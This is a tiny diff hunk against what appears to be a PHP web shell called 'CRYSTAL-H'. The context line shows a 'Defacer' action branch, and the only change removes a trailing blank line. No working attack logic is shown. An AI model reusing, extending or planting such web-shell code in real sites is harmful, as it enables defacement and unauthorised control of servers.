@@ -1125,4 +1125,3 @@ if ($act == "Defacer") {echo "<center><b>CRYSTAL-H:<br><br>Чгу Чсуксф Defacer<br
 
 
 </body></html>
-
